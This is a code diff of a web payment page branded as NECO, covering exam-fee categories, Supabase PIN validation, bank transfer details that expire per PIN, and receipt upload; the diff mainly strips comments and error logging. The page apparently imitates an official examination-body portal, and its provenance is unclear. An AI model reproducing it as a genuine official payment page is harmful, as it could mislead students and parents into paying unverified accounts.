@@ -8,7 +8,6 @@
     <!-- Supabase SDK -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        /* YOUR ORIGINAL CSS - KEEP AS IS (same as before) */
         *,:before,:after{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}:before,:after{--tw-content: ""}
         html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif}
         body{margin:0;line-height:inherit;background:#fff}
@@ -376,7 +375,7 @@
     </style>
 </head>
 <body>
-  <div id="app">
+<div id="app">
     <div class="router">
         <div class="shadow-md bg-white sticky w-full z-10 top-0">
             <div class="container py-2 relative">
@@ -386,15 +385,11 @@
                             <img src="https://i.imgur.com/cNVlGBu.jpeg" alt="NECO Logo" style="height: 56px; width: auto;">
                         </a>
                     </div>
-                    
-                    <!-- Desktop Menu -->
                     <div>
                         <ul class="hidden lg:flex lg:items-center lg:gap-8 lg:text-xs xl:text-sm text-slate-600">
                             <li><a class="text-gray-600 hover:text-gray-900 group flex items-center text-sm font-medium" href="index.html">Back to Home</a></li>
                         </ul>
                     </div>
-                    
-                    <!-- Mobile Menu Buttons -->
                     <div class="flex items-center gap-2 lg:hidden">
                         <button type="button" id="cancelMenuBtn" style="display: none;">
                             <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="block h-8 w-8 text-gray-600 hover:text-red-600">
@@ -411,7 +406,6 @@
                 </nav>
             </div>
         </div>
-        
         <div id="mobileMenu" style="display: none; position: fixed; top: 70px; left: 0; right: 0; background: white; border-radius: 0; box-shadow: 0 4px 20px rgba(0,0,0,0.15); z-index: 9999;">
             <a href="index.html" style="display: block; padding: 16px 20px; color: #4b5563; text-decoration: none; font-size: 16px; font-weight: 500; text-align: center; margin: 0;">Back to Home</a>
         </div>
@@ -436,39 +430,37 @@
                 </div>
             </div>
         </div>
-    </div>
-</div>
-                <div class="flex gap-3 mt-10 flex-wrap" id="categoryFilters">
-                    <div data-category="SSCE Internal" class="category-btn bg-[#EBEBEB] rounded p-3 text-[#747474] flex items-center gap-2 cursor-pointer !bg-white drop-shadow-md">
-                        <div class="w-2 rounded-full h-2" style="background-color: #0CA60C;"></div>
-                        <div>SSCE Internal</div>
-                    </div>
-                    <div data-category="SSCE External" class="category-btn bg-[#EBEBEB] rounded p-3 text-[#747474] flex items-center gap-2 cursor-pointer">
-                        <div class="w-2 rounded-full h-2" style="background-color: #145596;"></div>
-                        <div>SSCE External</div>
-                    </div>
-                    <div data-category="BECE" class="category-btn bg-[#EBEBEB] rounded p-3 text-[#747474] flex items-center gap-2 cursor-pointer">
-                        <div class="w-2 rounded-full h-2" style="background-color: #642D56;"></div>
-                        <div>BECE</div>
-                    </div>
-                    <div data-category="NCEE" class="category-btn bg-[#EBEBEB] rounded p-3 text-[#747474] flex items-center gap-2 cursor-pointer">
-                        <div class="w-2 rounded-full h-2" style="background-color: #1887EB;"></div>
-                        <div>NCEE</div>
-                    </div>
-                    <div data-category="Gifted" class="category-btn bg-[#EBEBEB] rounded p-3 text-[#747474] flex items-center gap-2 cursor-pointer">
-                        <div class="w-2 rounded-full h-2" style="background-color: #24809C;"></div>
-                        <div>Gifted</div>
-                    </div>
-                    <div data-category="Others" class="category-btn bg-[#EBEBEB] rounded p-3 text-[#747474] flex items-center gap-2 cursor-pointer">
-                        <div class="w-2 rounded-full h-2" style="background-color: #36454F;"></div>
-                        <div>Others</div>
-                    </div>
-                </div>
-
-                <div class="grid md:grid-cols-2 xl:grid-cols-4 lg:grid-cols-3 gap-10 mt-10" id="paymentGrid"></div>
+        
+        <div class="flex gap-3 mt-10 flex-wrap" id="categoryFilters">
+            <div data-category="SSCE Internal" class="category-btn bg-[#EBEBEB] rounded p-3 text-[#747474] flex items-center gap-2 cursor-pointer !bg-white drop-shadow-md">
+                <div class="w-2 rounded-full h-2" style="background-color: #0CA60C;"></div>
+                <div>SSCE Internal</div>
+            </div>
+            <div data-category="SSCE External" class="category-btn bg-[#EBEBEB] rounded p-3 text-[#747474] flex items-center gap-2 cursor-pointer">
+                <div class="w-2 rounded-full h-2" style="background-color: #145596;"></div>
+                <div>SSCE External</div>
+            </div>
+            <div data-category="BECE" class="category-btn bg-[#EBEBEB] rounded p-3 text-[#747474] flex items-center gap-2 cursor-pointer">
+                <div class="w-2 rounded-full h-2" style="background-color: #642D56;"></div>
+                <div>BECE</div>
+            </div>
+            <div data-category="NCEE" class="category-btn bg-[#EBEBEB] rounded p-3 text-[#747474] flex items-center gap-2 cursor-pointer">
+                <div class="w-2 rounded-full h-2" style="background-color: #1887EB;"></div>
+                <div>NCEE</div>
+            </div>
+            <div data-category="Gifted" class="category-btn bg-[#EBEBEB] rounded p-3 text-[#747474] flex items-center gap-2 cursor-pointer">
+                <div class="w-2 rounded-full h-2" style="background-color: #24809C;"></div>
+                <div>Gifted</div>
+            </div>
+            <div data-category="Others" class="category-btn bg-[#EBEBEB] rounded p-3 text-[#747474] flex items-center gap-2 cursor-pointer">
+                <div class="w-2 rounded-full h-2" style="background-color: #36454F;"></div>
+                <div>Others</div>
             </div>
         </div>
+
+        <div class="grid md:grid-cols-2 xl:grid-cols-4 lg:grid-cols-3 gap-10 mt-10" id="paymentGrid"></div>
     </div>
+</div>
 
 <!-- PAYMENT FORM MODAL -->
 <div id="paymentModal" class="fixed inset-0 z-30 hidden">
@@ -763,10 +755,8 @@
             if (error || !data) {
                 return { valid: false, accountDetails: null };
             }
-            
             return { valid: true, accountDetails: data };
         } catch (error) {
-            console.log('PIN validation error:', error);
             return { valid: false, accountDetails: null };
         }
     }
@@ -774,23 +764,15 @@
     // ============ MARK PIN AS USED ============
     async function markPinAsUsed(pinCode) {
         try {
-            await supabaseClient
-                .from('payment_pins')
-                .update({ status: 'used' })
-                .eq('pin', pinCode);
-        } catch (error) {
-            console.error('Error marking PIN as used:', error);
-        }
+            await supabaseClient.from('payment_pins').update({ status: 'used' }).eq('pin', pinCode);
+        } catch (error) {}
     }
     
     // ============ RENDER GRID IMMEDIATELY ============
     function renderGrid() {
         const grid = document.getElementById('paymentGrid');
         const cat = paymentData[currentCategory];
-        if (!cat || !cat.items) {
-            grid.innerHTML = '<div class="col-span-full text-center py-10">Loading payment items...</div>';
-            return;
-        }
+        if (!cat || !cat.items) return;
         
         grid.innerHTML = cat.items.map(item => {
             const amountDisplay = item.amount ? `NGN ${item.amount.toLocaleString()}` : 'Enter amount';
@@ -812,6 +794,7 @@
         }).join('');
     }
     
+    // Load default grid immediately
     renderGrid();
     
     // ============ CHECK FORM VALIDATION ============
@@ -1011,9 +994,7 @@
             
             loadingModal.style.display = 'flex';
             setTimeout(() => {
-                if (loadingModal) {
-                    loadingModal.style.display = 'none';
-                }
+                if (loadingModal) loadingModal.style.display = 'none';
                 showAccountModal();
             }, 3000);
         } else {
@@ -1034,14 +1015,12 @@
             if (remaining <= 0) {
                 clearInterval(countdownInterval);
                 timerElement.textContent = "Expired";
-                timerElement.style.color = "#9ca3af";
             }
         }, 1000);
     }
     
     // ============ SHOW ACCOUNT MODAL WITH BANK DETAILS ============
     async function showAccountModal() {
-        // Validate PIN again to make sure it's still active
         const result = await validatePinWithSupabase(currentFormData.paymentCode);
         
         if (!result.valid) {
@@ -1050,7 +1029,6 @@
         }
         
         const account = result.accountDetails;
-        // PIN expires after 30 minutes from generation
         const expiryTime = new Date(account.expires_at).getTime();
         
         document.getElementById('accountDetailsBox').innerHTML = `
@@ -1088,11 +1066,10 @@
         
         if (receiptInput) {
             if (receiptInput._listener) receiptInput.removeEventListener('change', receiptInput._listener);
-            const listener = (e) => {
+            receiptInput._listener = (e) => {
                 if (uploadedFileName) uploadedFileName.innerHTML = e.target.files[0] ? `✅ ${e.target.files[0].name}` : '';
             };
-            receiptInput.addEventListener('change', listener);
-            receiptInput._listener = listener;
+            receiptInput.addEventListener('change', receiptInput._listener);
             receiptInput.value = '';
         }
         if (uploadedFileName) uploadedFileName.innerHTML = '';
@@ -1106,13 +1083,11 @@
             const notification = document.getElementById('copyNotification');
             notification.style.display = 'flex';
             notification.classList.add('copy-notification-show');
-            setTimeout(function() {
+            setTimeout(() => {
                 notification.classList.remove('copy-notification-show');
                 notification.style.display = 'none';
             }, 2000);
-        }).catch(function(err) {
-            alert('Failed to copy. Please copy manually.');
-        });
+        }).catch(() => alert('Failed to copy. Please copy manually.'));
     }
     
     // ============ CONFIRM PAYMENT ============
@@ -1123,10 +1098,8 @@
         } 
         if (countdownInterval) clearInterval(countdownInterval);
         
-        // Mark PIN as used
         await markPinAsUsed(currentFormData.paymentCode);
         
-        // Save payment record
         try {
             await supabaseClient.from('payments').insert({
                 item_name: currentItem.name,
@@ -1136,9 +1109,7 @@
                 amount: currentFormData.totalAmount,
                 payment_code: currentFormData.paymentCode
             });
-        } catch (error) {
-            console.error('Error saving payment:', error);
-        }
+        } catch (error) {}
         
         closeAccountModal();
         
@@ -1202,22 +1173,12 @@
                 }
                 Object.assign(paymentData, newPaymentData);
                 renderGrid();
-                console.log('✅ Payment items synced with Supabase');
             }
-        } catch (error) {
-            console.log('Using default payment items');
-        }
+        } catch (error) {}
     }
     
-    // Sync in background
     setTimeout(syncPaymentItems, 500);
-    
-    // Listen for admin changes
-    window.addEventListener('storage', function(e) {
-        if (e.key === 'neco_sync_timestamp') {
-            syncPaymentItems();
-        }
-    });
+    window.addEventListener('storage', (e) => { if (e.key === 'neco_sync_timestamp') syncPaymentItems(); });
 </script>
 
 <!-- Mobile Menu Script -->
@@ -1231,23 +1192,19 @@
             e.stopPropagation();
             mobileMenu.style.display = 'block';
             menuBtn.style.display = 'none';
-            if (cancelBtn) cancelBtn.style.display = 'block';
+            cancelBtn.style.display = 'block';
         };
-        
-        if (cancelBtn) {
-            cancelBtn.onclick = function(e) {
-                e.stopPropagation();
-                mobileMenu.style.display = 'none';
-                cancelBtn.style.display = 'none';
-                menuBtn.style.display = 'block';
-            };
-        }
-        
+        cancelBtn.onclick = function(e) {
+            e.stopPropagation();
+            mobileMenu.style.display = 'none';
+            cancelBtn.style.display = 'none';
+            menuBtn.style.display = 'block';
+        };
         document.onclick = function(e) {
             if (mobileMenu && mobileMenu.style.display === 'block') {
                 if ((!menuBtn.contains(e.target) && (!cancelBtn || !cancelBtn.contains(e.target))) && !mobileMenu.contains(e.target)) {
                     mobileMenu.style.display = 'none';
-                    if (cancelBtn) cancelBtn.style.display = 'none';
+                    cancelBtn.style.display = 'none';
                     menuBtn.style.display = 'block';
                 }
             }
